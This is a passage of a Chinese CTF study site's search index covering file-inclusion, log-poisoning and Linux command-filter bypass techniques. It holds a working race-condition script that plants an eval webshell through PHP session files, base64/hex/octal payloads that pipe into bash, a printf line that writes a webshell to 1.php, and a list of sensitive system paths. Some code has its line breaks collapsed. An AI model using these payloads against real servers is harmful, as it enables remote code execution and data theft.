4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u3002</p> <p>\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5c06\u95ee\u53f7\u7f16\u7801\u6210</p> <pre><code>%253f\n</code></pre> <p>\u53ef\u4ee5\u7ed5\u8fc7phpmyadmin\u91cc\u9762\u7684\u8fc7\u6ee4\u51fd\u6570</p> <p>\u81f3\u4e8e\u6f0f\u6d1e\u7684\u539f\u7406\uff1a</p> <p>phpmyadmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09 - \u6dda\u7b11 - \u535a\u5ba2\u56ed</p> <p>\u6f0f\u6d1e\u8be6\u60c5 \u8303\u56f4 phpMyAdmin 4.8.0\u548c4.8.1 \u539f\u7406 \u9996\u5148\u5728index.php 50 63\u884c\u4ee3\u7801 \u6ee1\u8db35\u4e2a\u6761\u4ef6\u540e\u5c31\u4f1ainclude \u7684\u5185\u5bb9 \u4e0d\u4e3a\u7a7a \u662f\u5b57\u7b26\u4e32 \u4e0d\u4ee5index\u5f00\u5934 \u4e0d\u5728$t</p> <p>https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-0-0-0</p>"},{"location":"web_bak/include/include_pro/#session","title":"session\u6587\u4ef6\u5305\u542b","text":"<p>\u8bb0\u5f97\u4e4b\u524d\u53cd\u5e8f\u5217\u5316\u91cc\u9762session\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9</p> <p>\u8fd9\u91cc\u6240\u7528\u5230\u7684\u4e1c\u897f\u548c\u90a3\u4e2a\u4e00\u6837</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u5229\u7528</p> <p>\u4ee5\u4e0b\u6765\u81ea</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u672c\u6587\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2d\u7684session.upload_progress\u529f\u80fd\u4f5c\u4e3a\u8df3\u677f\uff0c\u4ece\u800c\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u3002</p> <p>https://www.freebuf.com/news/202819.html</p>"},{"location":"web_bak/include/include_pro/#_1","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>php5.5.38win10\u5173\u4e8esession\u76f8\u5173\u7684\u4e00\u5207\u914d\u7f6e\u90fd\u662f\u9ed8\u8ba4\u503c</p>"},{"location":"web_bak/include/include_pro/#_2","title":"\u793a\u4f8b\u4ee3\u7801","text":"<pre><code>&lt;?php$b=$_GET['file'];include \"$b\";?&gt;\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u4f46\u662f\u627e\u4e0d\u5230\u4e00\u4e2a\u53ef\u4ee5\u5305\u542b\u7684\u6076\u610f\u6587\u4ef6\u3002\u5176\u5b9e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528<code>session.upload_progress</code>\u5c06\u6076\u610f\u8bed\u53e5\u5199\u5165session\u6587\u4ef6\uff0c\u4ece\u800c\u5305\u542bsession\u6587\u4ef6\u3002\u524d\u63d0\u9700\u8981\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002</p>"},{"location":"web_bak/include/include_pro/#_3","title":"\u5206\u6790","text":"<p>\u95ee\u9898\u4e00</p> <p>\u4ee3\u7801\u91cc\u6ca1\u6709<code>session_start()</code>,\u5982\u4f55\u521b\u5efasession\u6587\u4ef6\u5462\u3002</p> <p>\u89e3\u7b54\u4e00</p> <p>\u5176\u5b9e\uff0c\u5982\u679c<code>session.auto_start=On</code>\uff0c\u5219PHP\u5728\u63a5\u6536\u8bf7\u6c42\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\uff0c\u4e0d\u518d\u9700\u8981\u6267\u884csession_start()\u3002\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u9009\u9879\u90fd\u662f\u5173\u95ed\u7684\u3002</p> <p>\u4f46session\u8fd8\u6709\u4e00\u4e2a\u9ed8\u8ba4\u9009\u9879\uff0csession.use_strict_mode\u9ed8\u8ba4\u503c\u4e3a0\u3002\u6b64\u65f6\u7528\u6237\u662f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49Session ID\u7684\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u5728Cookie\u91cc\u8bbe\u7f6ePHPSESSID=TGAO\uff0cPHP\u5c06\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff1a/tmp/sess_TGAO\u201d\u3002\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316Session\uff0cPHP\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u8fd9\u4e2a\u952e\u503c\u6709ini.get(\"session.upload_progress.prefix\")+\u7531\u6211\u4eec\u6784\u9020\u7684session.upload_progress.name\u503c\u7ec4\u6210\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc\u3002</p> <p>\u95ee\u9898\u4e8c</p> <p>\u4f46\u662f\u95ee\u9898\u6765\u4e86\uff0c\u9ed8\u8ba4\u914d\u7f6e<code>session.upload_progress.cleanup = on</code>\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u540e\uff0csession\u6587\u4ef6\u5185\u5bb9\u7acb\u5373\u6e05\u7a7a\uff0c</p> <p>\u5982\u4f55\u8fdb\u884crce\u5462\uff1f</p> <p>\u89e3\u7b54\u4e8c</p> <p>\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7ade\u4e89\uff0c\u5728session\u6587\u4ef6\u5185\u5bb9\u6e05\u7a7a\u524d\u8fdb\u884c\u5305\u542b\u5229\u7528\u3002</p>"},{"location":"web_bak/include/include_pro/#_4","title":"\u5229\u7528\u811a\u672c","text":"<pre><code>#coding=utf-8\u200bimport ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()\u200b        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\u56fe</p> <p></p>"},{"location":"web_bak/include/include_pro/#_5","title":"\u65e5\u5fd7\u5305\u542b","text":"<p>\u5728\u6211\u7684\u5370\u8c61\u4e2d\u662f\u6709\u8fd9\u6837\u7684\u64cd\u4f5c\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u4f5c\u7528\u3002</p>"},{"location":"web_bak/include/include_pro/#apache2","title":"apache2","text":"<p>\u4ee5ubuntu\u4e0bapache2\u4e3a\u4f8b\uff0c\u5148\u8bf7\u6c42<code>/&lt;?php phpinfo();?&gt;</code>\uff0c\u7136\u540e\u5305\u542b/var/log/apache2/access.log\u5373\u53ef</p>"},{"location":"web_bak/include/include_pro/#mail","title":"mail","text":"<p>/var/log/mail.log</p> <p>\u81f3\u4e8e\u53c2\u8003</p> <p>\u5b89\u6052\u676f6\u6708\u8d5bweb2 easypentest | JrXnm' blog</p> <p>https://blog.szfszf.top/tech/%E5%AE%89%E6%81%92%E6%9D%AF6%E6%9C%88%E8%B5%9B-easypentest/</p> <p>\u5df2\u7ecf\u6e17\u900f\u8fdb\u5185\u7f51</p>"},{"location":"web_bak/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u6211\u95ee\u8fc7\u5353\u817e\u9f99\u5b66\u957f</p> <p>\u5982\u679c\u6709\u4e0d\u4f1a\u7684\uff0c\u770b\u4e0d\u61c2\u7684\u53ef\u4ee5\u53bb\u95ee\u4ed6</p> <p>\u8fd9\u91cc\u7684\u5185\u5bb9\u4f1a\u7275\u626f\u5230\u4e00\u4e9blinux\u5185\u6838\uff0c\u5904\u7406\u673a\u5236\u76f8\u5173\u7684\u77e5\u8bc6</p> <p>\u5c31\u7b97\u5b9e\u5728\u4e0d\u4f1a\u5229\u7528\u7684\uff0c\u6211\u4e5f\u7ed9\u51fa\u4e86\u4e00\u79cd\u76f8\u5bf9\u7b80\u5355\u7684\u65b9\u6cd5</p> <p>\u4e0b\u9762\u662f\u9884\u5907\u77e5\u8bc6</p>"},{"location":"web_bak/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_1","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>LD_PRELOAD\u4f7f\u7528\u9650\u5236</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u867d\u7136\u5f88\u9177\uff0c\u4f46\u5374\u6709\u4e00\u4e9b\u9650\u5236\u3002\u6bd4\u5982\u5bf9\u4e8e\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u662f\u65e0\u6548\u7684\u3002\u56e0\u4e3a\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u4e0d\u9700\u8981\u8fde\u63a5\u52a8\u6001\u5e93\u7684\u9762\u7684\u51fd\u6570\u3002\u800c\u4e14\uff0c\u5047\u5982\u6587\u4ef6\u7684SUID\u6216SGID\u4f4d\u88ab\u7f6e1\uff0c\u52a0\u8f7d\u7684\u65f6\u5019\u4f1a\u5ffd\u7565LD_PRELOAD(\u8fd9\u662fld\u7684\u5f00\u53d1\u8005\u51fa\u4e8e\u5b89\u5168\u8003\u8651\u505a\u7684)\u3002</p>"},{"location":"web_bak/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_2","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":""},{"location":"web_bak/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#linux","title":"\u9996\u5148\u7ed9\u51falinux\u7a0b\u5e8f\u7684\u4e09\u79cd\u94fe\u63a5","text":"<pre><code>\u9759\u6001\u94fe\u63a5\uff1a\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e4b\u524d\u5148\u5c06\u5404\u4e2a\u76ee\u6807\u6a21\u5757\u4ee5\u53ca\u6240\u9700\u8981\u7684\u5e93\u51fd\u6570\u94fe\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u4e4b\u540e\u4e0d\u518d\u62c6\u5f00\u3002\n\u88c5\u5165\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u6e90\u7a0b\u5e8f\u7f16\u8bd1\u540e\u6240\u5f97\u5230\u7684\u4e00\u7ec4\u76ee\u6807\u6a21\u5757\uff0c\u5728\u88c5\u5165\u5185\u5b58\u65f6\uff0c\u8fb9\u88c5\u5165\u8fb9\u94fe\u63a5\u3002\n\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u539f\u7a0b\u5e8f\u7f16\u8bd1\u540e\u5f97\u5230\u7684\u76ee\u6807\u6a21\u5757\uff0c\u5728\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u9700\u8981\u7528\u5230\u65f6\u624d\u5bf9\u5b83\u8fdb\u884c\u94fe\u63a5\n</code></pre> <p>\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\uff0c\u9700\u8981\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5176\u4f5c\u7528\u5728\u4e8e\u5f53\u52a8\u6001\u5e93\u4e2d\u7684\u51fd\u6570\u53d1\u751f\u53d8\u5316\u5bf9\u4e8e\u53ef\u6267\u884c\u7a0b\u5e8f\u6765\u8bf4\u65f6\u900f\u660e\u7684\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u65e0\u9700\u91cd\u65b0\u7f16\u8bd1\uff0c\u65b9\u4fbf\u7a0b\u5e8f\u7684\u53d1\u5e03/\u7ef4\u62a4/\u66f4\u65b0\u3002\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u662f\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\uff0c\u8fd9\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u5047\u5982\u7a0b\u5e8f\u52a8\u6001\u52a0\u8f7d\u7684\u51fd\u6570\u662f\u6076\u610f\u7684\uff0c\u5c31\u6709\u53ef\u80fd\u5bfc\u81f4disable_function\u88ab\u7ed5\u8fc7\u3002(\u8fd9\u91cc\u7684disable_function\u5c31\u662f\u7cfb\u7edf\u6240\u8fc7\u6ee4\u7684\u51fd\u6570\u3002)</p>"},{"location":"web_bak/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#ld_preload_1","title":"LD_PRELOAD\u4ecb\u7ecd","text":"<p>\u5728UNIX\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e16\u754c\u4e2d\uff0cLD_PRELOAD\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u5f71\u54cd\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u7684\u94fe\u63a5\uff08Runtimelinker\uff09\uff0c\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4e2a\u529f\u80fd\u4e3b\u8981\u5c31\u662f\u7528\u6765\u6709\u9009\u62e9\u6027\u7684\u8f7d\u5165\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\u3002\u901a\u8fc7\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u529f\u80fd\u6765\u4f7f\u7528\u81ea\u5df1\u7684\u6216\u662f\u66f4\u597d\u7684\u51fd\u6570\uff08\u65e0\u9700\u522b\u4eba\u7684\u6e90\u7801\uff09\uff0c\u800c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ee5\u5411\u522b\u4eba\u7684\u7a0b\u5e8f\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\uff0c\u4ece\u800c\u8fbe\u5230\u90a3\u4e0d\u53ef\u544a\u4eba\u7684\u7f6a\u6076\u7684\u76ee\u7684\u3002</p>"},{"location":"web_bak/linux/linux%E7%AE%A1%E9%81%93%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","title":"linux\u7ba1\u9053\u7b26\u4e0e\u91cd\u5b9a\u5411","text":"<p>\u7ba1\u9053\u7b26\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u8fc7\u6ee4\u7684\u6bd4\u8f83\u591a\uff0c\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\u6389\u7684\u7ba1\u9053\u7b26\u5f80\u5f80\u5374\u53c8\u662f\u8003\u5bdf\u70b9</p> <p>\u4ee5\u4e0b\u5185\u5bb9\u5168\u90e8\u90fd\u4e0d\u662f\u539f\u521b</p> <p>1\uff0c\u591a\u547d\u4ee4\u6267\u884c\u7b26\u2019</p> <p></p> <p>\u4f8b\uff1als;date;pwd \u4f1a\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u6267\u884c</p> <p>ls &amp;&amp; echo yes || echo no</p> <p>ls\u547d\u4ee4\u6267\u884c\u6b63\u786e\u6253\u5370yes\u6267\u884c\u9519\u8bef\u6253\u5370no</p> <p>Linux\u4e4b\u7ba1\u9053\u7b26</p> <p></p> <p>\u4f8b\uff1aps aux | grep nginx</p> <p>\u547d\u4ee41: \uff08ps aux\uff09ps\u547d\u4ee4\u5c31\u662f\u6700\u57fa\u672c\u8fdb\u7a0b\u67e5\u770b\u547d\u4ee4\uff0c-a \uff1a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u8fdb\u7a0b\uff1b</p> <p>-u \uff1a\u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u8fdb\u7a0b\u72b6\u6001 \uff1bx \uff1a\u901a\u5e38\u4e0e a \u8fd9\u4e2a\u53c2\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u53ef\u5217\u51fa\u8f83\u5b8c\u6574\u4fe1\u606f\u3002</p> <p>\u547d\u4ee42\uff1a\uff08grep nginx\uff09\u4eceps aux\u6267\u884c\u7ed3\u679c\u4e2d\u5bfb\u627e\u542b\u6709nginx\u7684\u884c</p> <p>linux\u91cd\u5b9a\u5411</p> <pre><code>1.1      \u91cd\u5b9a\u5411\u7b26\u53f7\n&gt;               \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;!              \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u5f3a\u5236\u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;&gt;             \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u539f\u6765\u7684\u6587\u4ef6\n&lt;               \u8f93\u5165\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u7a0b\u5e8f \n1.2\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u7b26\u53f7\n2&gt;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  b-shell\n2&gt;&gt;           \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u5230\u539f\u6765\u7684\u6587\u4ef6\n2&gt;&amp;1         \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa \u6ce8\u91ca:1 \u53ef\u80fd\u5c31\u662f\u4ee3\u8868 \u6807\u51c6\u8f93\u51fa\n&gt;&amp;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  c-shell\n|&amp;              \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef \u7ba1\u9053 \u8f93\u9001 \u5230\u53e6\u4e00\u4e2a\u547d\u4ee4\u4f5c\u4e3a\u8f93\u5165\n1.3\u547d\u4ee4\u91cd\u5bfc\u5411\u793a\u4f8b\n\u5728 bash \u547d\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e3b\u8981\u6709\u4e09\u79cd\u8f93\u51fa\u5165\u7684\u72b6\u51b5\uff0c\u5206\u522b\u662f\uff1a\n1. \u6807\u51c6\u8f93\u5165\uff1b\u4ee3\u7801\u4e3a 0 \uff1b\u6216\u79f0\u4e3a stdin \uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a &lt;\n2. \u6807\u51c6\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 1 \uff1b\u6216\u79f0\u4e3a stdout\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 1&gt;\n3. \u9519\u8bef\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 2 \uff1b\u6216\u79f0\u4e3a stderr\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 2&gt;\n[test @test test]# ls -al &gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u8f93\u51fa\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u82e5\u8be5\u6587\u4ef6\u4ee5\u5b58\u5728\u5219\u4e88\u4ee5\u53d6\u4ee3\uff01\n[test @test test]# ls -al &gt;&gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u7d2f\u52a0\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u8be5\u6587\u4ef6\u4e3a\u7d2f\u52a0\u7684\uff0c\u65e7\u6570\u636e\u4fdd\u7559\uff01\n[test @test test]# ls -al  1&gt; list.txt   2&gt; list.err\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u8f93\u51fa\u5230 list.err\n[test @test test]# ls -al 1&gt; list.txt 2&gt; &amp;1\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u4e0d\u8bba\u6b63\u786e\u6216\u9519\u8bef\u5747\u8f93\u51fa\u5230 list.txt \u5f53\u4e2d\uff01\u9519\u8bef\u4e0e\u6b63\u786e\u6587\u4ef6\u8f93\u51fa\u5230\u540c\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5219\u5fc5\u987b\u4ee5\u4e0a\u9762\u7684\u65b9\u6cd5\u6765\u5199\uff01\u4e0d\u80fd\u5199\u6210\u5176\u5b83\u683c\u5f0f\uff01[test @test test]# ls -al 1&gt; list.txt 2&gt; /dev/null\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u5219\u4e88\u4ee5\u4e22\u5f03\uff01 /dev/null \uff0c\u53ef\u4ee5\u8bf4\u6210\u662f\u9ed1\u6d1e\u88c5\u7f6e\u3002\u4e3a\u7a7a\uff0c\u5373\u4e0d\u4fdd\u5b58\u3002\n</code></pre> <p>\u5176\u5b9e\u4e5f\u633a\u597d\u8bb0\u7684,\u5c31\u50cf\u4e00\u4e2a\u7bad\u5934\u4e00\u6837</p> <p>\u8fd8\u53ef\u4ee5\u7528\u7ba1\u9053\u7b26\u6765\u521b\u5efa\u6587\u4ef6echo xxx &gt;1.txt</p>"},{"location":"web_bak/linux/linux%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"linux\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u62fc\u63a5\u7ed5\u8fc7</p> <pre><code>#\u6267\u884cls\u547d\u4ee4\uff1a\na=l;b=s;$a$b\n#cat flag\u6587\u4ef6\u5185\u5bb9\uff1a\na=c;b=at;c=f;d=lag;$a$b${c}${d}\n#cat test\u6587\u4ef6\u5185\u5bb9\na=\"ccaatt\";b=${a:0:1}${a:2:1}${a:4:1};$btest\n</code></pre> <p>\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>#base64\necho \"Y2F0IC9mbGFn\"|base64 -d|bash ==&gt;cat /flag\necho Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag\n#hex\necho \"0x636174202f666c6167\" | xxd -r -p|bash ==&gt;cat /flag\n#oct/\u5b57\u8282\n$(printf \"\\154\\163\") ==&gt;ls\n$(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") ==&gt;cat /flag\n{printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|\\$0 ==&gt;cat /flag\n\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5199\u9a6c\n\u5185\u5bb9\u4e3aphp @eval($_POST['c']);?&gt;\n${printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} &gt;&gt; 1.php\u3002\n</code></pre> <p>\u6b63\u5219\u5339\u914d</p> <pre><code>cat t?st\ncat te*\ncat t[a-z]st\ncat t{a,b,c,d,e,f}st\n</code></pre> <p>\u5f02\u6216\u7ed5\u8fc7\uff08linux\u53ef\u4ee5\u8fd9\u4e48\u7528\uff0c\u4f46\u8fd9\u91cc\u5e94\u8be5\u4e0d\u662flinux\uff09</p> <pre><code>var_dump('#'^'|'); //\u5f97\u5230\u5b57\u7b26 _\nvar_dump('.'^'~'); //\u5f97\u5230\u5b57\u7b26 P\nvar_dump('/'^'`'); //\u5f97\u5230\u5b57\u7b26 0\nvar_dump('|'^'/'); //\u5f97\u5230\u5b57\u7b26 S\nvar_dump('{'^'/'); //\u5f97\u5230\u5b57\u7b26 T\n$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); //\u53d8\u91cf$__\u503c\u4e3a\u5b57\u7b26\u4e32'_POST'\n</code></pre> <pre><code>#\u7ed9\u51fa\u811a\u672cif __name__ == \"__main__\":\nfor i in range(0,127):\nfor j in range(0,127):\nresult=i^j\nif(chr(result) is '\u60f3\u8981\u7684\u5b57\u7b26'):\nprint(' '+chr(i)+' xor '+chr(j)+' == '+chr(result))\u7f29\u8fdb\u81ea\u5df1\u6765\n</code></pre>"},{"location":"web_bak/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/","title":"Web\u5e38\u7528linux\u8def\u5f84","text":"<p>web\u5e38\u7528linux\u8def\u5f84:</p> <p>1./etc/passwd</p> <p>2./etc/hosts</p> <p>3./proc/net/arp</p> <p>4./proc/net/dev</p> <p>5./proc/net/dev_mcast</p> <p>6./proc/net/igmp</p> <p>7./proc/net/netlink</p> <p>8./proc/net/netstat</p> <p>9./proc/net/raw</p> <p>10./proc/net/route</p> <p>11./proc/net/rt_cache</p> <p>12./proc/net/snmp</p> <p>13./proc/net/sockstat</p> <p>14./proc/net/tcp</p> <p>15./proc/net/udp</p> <p>16./proc/net/unix</p>"},{"location":"web_bak/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procself","title":"/proc/self/","text":""},{"location":"web_bak/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfenviron","title":"/proc/self/environ","text":"<p>\u5c1d\u8bd5\u8bbf\u95ee/proc/self/environ</p> <p>/proc/self\u2013\u5176\u8def\u5f84\u6307\u5411\u5f53\u524d\u8fdb\u7a0b</p> <p>/environ\u2013\u8bb0\u5f55\u5f53\u524d\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4fe1\u606f</p>"},{"location":"web_bak/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfroot","title":"/proc/self/root","text":"<p>/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u60f3\u5230\u8fd9\u91cc\uff0c\u7528\u4f2a\u534f\u8bae\u914d\u5408\u591a\u7ea7\u7b26\u53f7\u94fe\u63a5\u7684\u529e\u6cd5\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u6f0f\u6d1e\u5b58\u5728\u7684\u4f4d\u7f6e\u4f4d\u4e8ephp\u7684\u5185\u6838\uff08\u6211\u662f\u5f88\u60f3\u5c1d\u8bd5\u505a\u4e00\u6b21\u8c03\u8bd5\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u7740\uff09</p> 